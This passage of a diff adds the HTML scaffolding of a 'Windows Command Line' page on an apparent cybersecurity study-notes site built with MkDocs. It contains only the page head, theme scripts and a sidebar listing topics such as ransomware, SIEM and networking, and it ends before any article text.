@@ -1,0 +1,6848 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../Event%20Tracing%20for%20Windows%20%28ETW%29/">
+      
+      
+        <link rel="next" href="../Windows%20Event%20Logs/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Windows Command Line - CyberHack Learning</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#overview" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../.." title="CyberHack Learning" class="md-header__button md-logo" aria-label="CyberHack Learning" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            CyberHack Learning
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Windows Command Line
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="custom" data-md-color-accent="custom"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../Core%20Security%20Concepts/Cyber%20Kill%20Chain/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Cyber Notes
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../.." title="CyberHack Learning" class="md-nav__button md-logo" aria-label="CyberHack Learning" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    CyberHack Learning
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cyber Notes
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Cyber Notes
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Knowledge
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Knowledge
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1_1" id="__nav_2_1_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Core Security Concepts
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_1_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Core Security Concepts
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Core%20Security%20Concepts/Cyber%20Kill%20Chain/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cyber Kill Chain
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Core%20Security%20Concepts/DDoS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DDoS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Core%20Security%20Concepts/Insider%20Threat/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Insider Threat
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Core%20Security%20Concepts/MITRE%20ATT%26CK%20Framework/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MITRE ATT&CK Framework
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Core%20Security%20Concepts/OSINT/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OSINT
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Core%20Security%20Concepts/Ransomware/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ransomware
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Core%20Security%20Concepts/Security%20Domains/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Security Domains
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Core%20Security%20Concepts/Security%20Principles/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Security Principles
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Core%20Security%20Concepts/Social%20Engineering/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Social Engineering
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Core%20Security%20Concepts/Threat%20Actors/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Threat Actors
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1_2" id="__nav_2_1_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cryptography
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Cryptography
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Cryptography/Cryptography%20Basics/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cryptography Basics
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Cryptography/Hashing%20Basics/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hashing Basics
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Cryptography/Public%20Key%20Basics/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Public Key Basics
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1_3" id="__nav_2_1_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Defensive Security
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Defensive Security
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Defensive%20Security/Defensive%20Security%20Intro/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Defensive Security Intro
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Defensive%20Security/Digital%20Forensics%20Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Digital Forensics Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Defensive%20Security/Incident%20Response%20Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Incident Response Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Defensive%20Security/Log%20Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Log Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Defensive%20Security/SOC%20Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SOC Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_3_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1_3_6" id="__nav_2_1_3_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Security Solutions
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_1_3_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1_3_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Security Solutions
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Defensive%20Security/Security%20Solutions/Intro%20to%20SIEM/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Intro to SIEM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Defensive%20Security/Security%20Solutions/Intrusion%20Detection%20Systems%20%28IDS%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Intrusion Detection Systems (IDS)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Defensive%20Security/Security%20Solutions/Vulnerability%20Scanners/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Vulnerability Scanners
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1_4" id="__nav_2_1_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Foundational CS
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_1_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Foundational CS
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Foundational%20CS/ARM%20Processor%20Architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ARM Processor Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Foundational%20CS/CPU%20Architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CPU Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Foundational%20CS/Data%20Representation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Data Representation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Foundational%20CS/Input%20and%20Output/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Input and Output
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Foundational%20CS/Memory%20Architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Memory Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Foundational%20CS/Multi-Processing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Multi Processing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Foundational%20CS/x86%20Architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    x86 Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1_5" id="__nav_2_1_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Networking
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_1_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Networking
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/DNS%20%28Domain%20Name%20System%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS (Domain Name System)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/Data%20Transmission%20Methods/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Data Transmission Methods
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/FTP/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    FTP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/Firewalls/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Firewalls
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/HTTP%20%26%20HTTPS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HTTP & HTTPS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Networking/IMAP%20%26%20POP3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
